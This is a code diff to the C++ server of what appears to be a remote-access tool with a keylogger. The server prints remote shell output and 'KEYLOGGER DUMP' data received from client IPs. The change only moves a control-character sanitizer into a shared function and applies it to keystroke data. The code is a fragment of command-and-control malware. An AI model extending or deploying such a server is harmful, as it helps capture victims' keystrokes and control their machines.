@@ -255,17 +255,6 @@ void Server::printShellOutput(const std::string& ip, const std::string& payload)
     // This filter strips all control characters except whitespace (\n, \r, \t) and
     // printable ASCII (0x20–0x7E). Raw bytes on the wire are NOT affected.
     // NOTE: In Circle 5, raw bytes will be stored unmodified in the PostgreSQL database.
-    auto sanitize = [](const std::string& s, size_t offset, size_t len) -> std::string {
-        std::string out;
-        out.reserve(len);
-        for (size_t i = offset; i < offset + len && i < s.size(); ++i) {
-            const unsigned char c = static_cast<unsigned char>(s[i]);
-            if (c == '\n' || c == '\r' || c == '\t' || (c >= 0x20 && c != 0x7F)) {
-                out.push_back(static_cast<char>(c));
-            }
-        }
-        return out;
-    };
 
     const uint8_t  status   = static_cast<uint8_t>(payload[0]);
     const uint16_t data_len = (static_cast<uint16_t>(static_cast<uint8_t>(payload[1])) << 8)
@@ -274,12 +263,12 @@ void Server::printShellOutput(const std::string& ip, const std::string& payload)
     if (status == 0) {
         // Data chunk — print directly without separator
         if (payload.size() >= static_cast<size_t>(3 + data_len)) {
-            std::cout << sanitize(payload, 3, data_len) << std::flush;
+            std::cout << sanitizeOutput(payload, 3, data_len) << std::flush;
         }
     } else if (status == 1) {
         // Last chunk — flush any remaining data, then print separator
         if (data_len > 0 && payload.size() >= static_cast<size_t>(3 + data_len)) {
-            std::cout << sanitize(payload, 3, data_len);
+            std::cout << sanitizeOutput(payload, 3, data_len);
         }
         std::cout << "\n" << std::setfill('-') << std::setw(60) << ""
                   << "\n[Server] Shell command from " << ip << " completed.\n"
@@ -287,7 +276,7 @@ void Server::printShellOutput(const std::string& ip, const std::string& payload)
     } else {
         // status == 2: error
         std::cerr << "[Server] Shell error from " << ip << ": "
-                  << sanitize(payload, 3, data_len) << std::endl;
+                  << sanitizeOutput(payload, 3, data_len) << std::endl;
     }
 }
 
@@ -311,7 +300,7 @@ void Server::printKeylogData(const std::string& ip, const std::string& payload) 
                     
     if (payload.size() < static_cast<size_t>(12 + len)) return;
     
-    std::string keystrokes = payload.substr(12, len);
+    std::string keystrokes = sanitizeOutput(payload, 12, len);
     
     std::cout << "\n" << std::setfill('*') << std::setw(60) << "" << "\n";
     std::cout << "[Server] KEYLOGGER DUMP from " << ip << "\n";
@@ -323,6 +312,19 @@ void Server::printKeylogData(const std::string& ip, const std::string& payload) 
         std::cout << keystrokes << "\n";
     }
     std::cout << std::setfill('*') << std::setw(60) << "" << "\n" << std::endl;
+}
+
+std::string Server::sanitizeOutput(const std::string& s, size_t offset, size_t len) {
+    std::string out;
+    out.reserve(len);
+    for (size_t i = offset; i < offset + len && i < s.size(); ++i) {
+        const unsigned char c = static_cast<unsigned char>(s[i]);
+        // Strip control characters except newline, carriage return, and tab
+        if (c == '\n' || c == '\r' || c == '\t' || (c >= 0x20 && c != 0x7F)) {
+            out.push_back(static_cast<char>(c));
+        }
+    }
+    return out;
 }
 
 } // namespace inferno
